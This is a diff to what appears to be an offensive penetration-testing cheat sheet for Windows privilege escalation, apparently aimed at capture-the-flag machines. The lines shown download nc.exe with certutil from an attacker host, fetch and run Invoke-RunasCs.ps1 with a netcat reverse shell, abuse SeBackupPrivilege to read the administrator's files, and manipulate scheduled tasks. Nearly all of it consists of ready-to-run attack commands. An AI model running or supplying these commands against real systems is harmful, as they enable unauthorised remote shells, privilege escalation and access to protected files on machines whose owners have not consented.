@@ -1204,7 +1204,11 @@ certutil -urlcache -f http://$MYIP:8888/windows/nc.exe \programdata\nc.exe; cert
 [*] Privilege Escalation
 +---------- Priv Check ----------+
 powershell -c "whoami /user /priv /groups"
-net user 
+net user $USERNAME
+
++---------- Switch User: Known Creds ----------+
+rlwrap nc -lvnp 5566
+IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/Invoke-RunasCs.ps1'); Invoke-RunasCs -Username $USERNAME -Password $PASSWORD -Command cmd.exe -Remote $MYIP:5566
 
 +---------- SeBackupPrivilege ----------+
 robocopy /b \users\administrator\desktop\ .; type \users\administrator\desktop\root.txt
@@ -1244,10 +1248,6 @@ powershell -c "wmic service get name,displayname,pathname,startmode |findstr /i 
 +---------- Scheduled Tasks ----------+
 powershell -c "$task = Get-ScheduledTask -TaskName 'Ownership'; $task.Actions; $task.Triggers; $task.Settings; $task | Format-List *"
 powershell -c "Start-ScheduledTask -TaskName 'Ownership'"
-
-+---------- Switch User ----------+
-rlwrap nc -lvnp 5566
-IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/Invoke-RunasCs.ps1'); Invoke-RunasCs -Username $USERNAME -Password $PASSWORD -Command cmd.exe -Remote $MYIP:5566
 
 +---------- Shell From File ----------+
 rlwrap nc -lvnp 5555
